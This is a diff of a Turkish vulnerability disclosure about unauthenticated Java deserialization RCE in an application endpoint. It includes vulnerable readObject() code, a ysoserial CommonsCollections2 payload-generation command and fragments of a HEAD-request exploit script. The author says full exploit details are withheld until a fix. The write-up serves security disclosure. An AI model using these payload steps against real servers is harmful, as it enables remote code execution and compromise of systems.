@@ -8,13 +8,14 @@ description: "CWE-502"
 **Severity:** Critical (CVSS v3.1 = **9.8**) (Full system compromise risk)\
 **CWE:** CWE-502
 
-Deserializasyon hataları Java ekosisteminde sık ve tehlikelidir, zayıf bir `readObject()` çağrısı, uygun gadget zincirleriyle çalıştırılabilecek kötü amaçlı kodu doğrudan tetikler. Eğer uygulama dışarıdan yazılabilen dosyaları deserialize ediyorsa veya web katmanı üzerinden bu içeriği içe alıyorsa, risk **uzaktan** ve **kimlik doğrulamasız** hale gelir.
+Uygulamadaki `/logo/smart/runapp` uç noktası, kimlik doğrulaması olmadan gelen istek gövdesini **Java **`ObjectInputStream.readObject()` ile işliyor. Bu sayede **serileştirilmiş (serialized) kötü niyetli nesne** gönderildiğinde, bilinen **gadget zincirleri** (`CommonsCollections2` + `TemplatesImpl`) aracılığıyla **RCE** mümkün oluyor. İstismar, **GET/POST** yanında uygulama hatası nedeniyle **HEAD** isteği ile de tetiklenebiliyor.
 
 ## Olay Akışı
 
-- Web uygulaması `xx.xxx.xx.xxx:8080/xxxx/smart/run` üzerinde çalışıyor ve `PUT` yöntemine açık.
-- `PUT /xxxx/smart/runapp.jnlp` gibi bir istekle `runapp.jnlp` içeriği değiştirebiliyorsun (auth gerekmiyor).
-- Sunucular daha sonra bu JNLP dosyasını veya içindeki referansları okuyup`ObjectInputStream` ile deserialize ediyor.
+1. `http://xx.xxx.xx.xxx:8080/logo/smart/runapp?...` uç noktası tespit edildi; yanıt olarak JNLP döndürdüğü ve **kimlik doğrulaması istemediği** görüldü.
+2. JNLP içinde ana bileşenler `Startupv3.*.jar` vb. JAR’lara işaret ediyor.
+3. JAR analizi sırasında `com.lbs.start.SocketToken` sınıfında `new ServerSocket(port)` ve `new ObjectInputStream(...).readObject()` çağrıları belirlendi; gelen mesajlar filtre/allow-list olmadan işleniyor.
+4. `ysoserial` ile hazırlanan `payload.ser` CommonsCollections2 + TemplatesImpl + `Runtime.exec`) **HEAD** isteğinin **gövdesi** olarak `/smart/runapp`’a gönderildi ve **sunucuda dosya oluşturma** ile RCE doğrulandı.
 
 ## Teknik kanıt
 
@@ -28,27 +29,18 @@ message = (String) in.readObject(); // doğrudan deserializasyon
 // ...
 message = (String) in.readObject(); // tekrarlanarak kullanılmakta
 if (message != null && message.equals("LBS_Hello")) {
+
+// initlisten içinde
+
+connection = ms_Instance.accept();
+in = new ObjectInputStream(connection.getInputStream());
+processor.processToken(message);
 ```
 
 - Ayrıca `initListen(...)` içinde `ms_Instance.accept()` ile kabul edilen bağlantılarda yine `new ObjectInputStream(connection.getInputStream())` çağrısı ve `processor.processToken(message)` ile gelen nesnenin uygulama mantığına verildiği görülüyor.
-- Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.
-
-Sunucu portunu bulma işide zor değil, aynı yapıda nasıl bulunabileceği gösteriliyor.
-
-```java
-/*     */   public static int createPortNumber(int userId, int firmNr) {
-/*  52 */     int port = 50000 + firmNr * 100;
-/*  53 */     port += userId;
-/*  54 */     return port;
-/*     */   }
-```
-
-Ne demiştik, sunucu 8080 portu üzerinden yabancı kabul ediyor, ben şunu buldum, xxxxxxxx:50011\
-gibi portları deneyince öyle bir port var ama dışarıya erişimi kapalıydı.
-
-Herşey okey, kodlarda  biz zafiyet var, .ser dosyamı hazırladım ama karşı sunucular lokalde çalışıyor, dışarıya erişimi kapalı. Hemen planlamaya geçtim, 8080 portu eğer lokal sunuculara aracı olabilmemi sağlarsa bunu RCE olarak geçirebilirdim, hemen denedim.\
-\
-[exploit.py](http://exploit.py)
+- Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.\
+  \
+  [exploit.py](http://exploit.py) // HEAD ile tetikleme
 
 ```python
 import requests
@@ -70,18 +62,6 @@ else:
     print(f"[!] Error: {response.status_code}")
 ```
 
-Öyle çetrefilli bir olayı yok, tek önemli kısım şurası `url = "http://xx.xxx.xxx.xx:8080/xxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001"`\
-jar dosyalarından incelemem ile linke bu şekilde parametreler gönderdiğim zaman herhangibi bir doğrulama işlemi gerçekleştirmeden onaylıyor. Geriye kalan tek olayımız şu, runapp.jnlp'e dosyamızı atmak ve deserilize ediyormu onu ölçmek.
-
-<img
-  src="/images/Ekrangörüntüsü2025-11-01031514.png"
-  alt="Ekrangörüntüsü2025 11 01031514 Pn"
-  title="Ekrangörüntüsü2025 11 01031514 Pn"
-  style={{ width:"75%" }}
-/>
-
-![Görsel 2025 11 01 235930916 Pn](/images/görsel_2025-11-01_235930916.png)
-
 ```bash
 java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
@@ -90,6 +70,18 @@ java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
      -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
 ```
 
+<img
+  src="/images/Ekrangörüntüsü2025-11-01031514.png"
+  alt="Ekrangörüntüsü2025 11 01031514 Pn"
+  title="Ekrangörüntüsü2025 11 01031514 Pn"
+  style={{ width:"75%" }}
+/>
+
+## Kanıtın Gözlemi
+
+Pyhon komutu ile HEAD isteği başarı ile gönderildi.
+
+\
 Görselde ki gibi, gerçektende runapp.jnlp'e dosya göndermeyi başardım ve 8080 portu üzerinde dosyamı görebiliyordum. aynı şekilde jnlp dosyası içerisinde de .ser dosyamın referansı gözüküyordu. Son kod bloğu ise payload.ser'in içeriğiydi ve gerçektende sistemde gadget çalıştırıp tmp/pwned klasörünü oluşturmuştum.
 
 Şu anda ilgili firma zafiyeti tamamen gidermediği için, güvenlik riski devam ettiği sürece ayrıntılı poc veya exploit kodu yayımlamıyorum.
